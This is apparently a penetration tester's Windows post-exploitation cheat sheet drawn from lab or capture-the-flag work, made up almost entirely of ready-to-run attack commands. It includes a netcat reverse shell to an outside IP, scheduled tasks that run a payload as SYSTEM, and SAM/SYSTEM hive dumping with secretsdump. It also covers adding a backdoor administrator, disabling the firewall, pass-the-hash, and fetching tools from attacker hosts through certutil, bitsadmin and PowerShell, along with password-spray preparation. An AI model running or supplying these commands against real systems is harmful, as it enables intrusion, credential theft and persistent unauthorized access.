### Runas Powershell
https://stackoverflow.com/questions/28989750/running-powershell-as-another-user-and-launching-a-script
```
$username = 'user'
$password = 'password'

$securePassword = ConvertTo-SecureString $password -AsPlainText -Force
$credential = New-Object System.Management.Automation.PSCredential $username, $securePassword
Start-Process Notepad.exe -Credential $credential
```
### Powershell options
```
powershell.exe -ExecutionPolicy Bypass -NoLogo -NonInteractive - NoProfile
```

### Runas cmd
```
runas /user:Administrator "c:\test\nc.exe 192.168.49.186 53 -e cmd.exe" < password.txt
```

### Runas with Scheduled Task in Powershell
```
$pw = ConvertTo-SecureString '+9B1w$XVK!qR1c' -AsPlainText -Force
$creds = New-Object System.Management.Automation.PSCredential ("Administrator", $pw)

Invoke-Command -Computer hutchdc -ScriptBlock { schtasks /create /sc onstart /tn shell /tr C:\test\bad.exe /ru SYSTEM } -Credential $creds

Invoke-Command -Computer hutchdc -ScriptBlock { schtasks /run /tn shell } -Credential $creds
```

### Runas with Scheduled Task in cmd
```
schtasks /create /sc MINUTE /tn shell /tr C:\test\bad.exe /ru Administrator /rp #8E)[,m63d8juk
schtasks /run /tn shell
```

### Dump hashes
````
reg save hklm\sam .\sam
reg save hklm\system .\system
reg save hklm\security .\security

secretsdump.py -sam sam -system system -security security LOCAL > hashes.txt
````
### Add RDP user
````
net user hacker hacker123 /add
net localgroup Administrators hacker /add
net localgroup "Remote Desktop Users" hacker /ADD
````
### Turn off firewall 
````
NetSh Advfirewall set allprofiles state off
````

#### Pass the hash
````
pth-winexe -U JEEVES/administrator%aad3b43XXXXXXXX35b51404ee:e0fb1fb857XXXXXXXX238cb
e81fe00 //10.129.26.210 cmd.exe

````


#### Ping test blind rce
```sh
C:\Windows\System32\cmd.exe /c ping 10.10.14.27
# on linux box: 
tcpdump -i tun0 icmp
```


#### Ping test blind rce like above check if x64 powershell exists
```sh
C:\Windows\SysNative\WindowsPowerShell\v1.0\powershell.exe ping 10.10.14.27
```

#### Download files
```bash
certutil.exe -urlcache -split -f http://10.10.14.10:8000/nc64.exe C:\\Users\\Public\\nc64.exe

powershell -c "(new-object System.Net.WebClient).DownloadFile('http:/
/10.11.0.4/wget.exe','C:\Users\admin\Desktop\wget.exe')"

powershell iwr -uri http://10.10.16.97:8000/chisel.exe -outfile ch.exe # also works in PS ConstrainLanguageMode

expand http://10.10.14.10:8000/watson.exe C:\\Users\\Public\\watson.exe

bitsadmin /transfer debjob /download /priority normal http://10.10.14.10:8000/watson.exe C:\Users\\Public\watson.exe

```

#### md5checksum
```
certutil.exe -hashfile Taihou64.exe MD5
```

#### Alternate Data streams 
````
dir /R file.txt - to check 
expand hm.txt:root.txt root.txt
powershell -command " Get-Content C:\ADS\1.txt -Stream file.exe -Raw"


````

#### List directory permissions (win server 2003)
```sh
icacls c:\*. /C
```


#### List alternate data stream files
```sh
dir /r
```

#### Mount windows account share using cifs, "ACCT here is account share name"
```bash
sudo mount -t cifs -o username=Finance //10.1.1.1/ACCT /mnt/win_share/
```

#### Mount vhd file from share
```bash
sudo guestmount --add 9b9cfbc4-369e-11e9-a17c-806e6f6e6963.vhd --inspector -ro -v /path/to/mount/directory
```



#### Dump password policy to prepare wordlist for password spray if smb null authentication allows domain enumeration.
```sh
crackmapexec smb 10.10.10.161 --pass-pol -u '' -p ''
```
#### Check account lock policy before password spraying smb
```bash
crackmapexec smb 10.10.10.123 --pass-pol
```

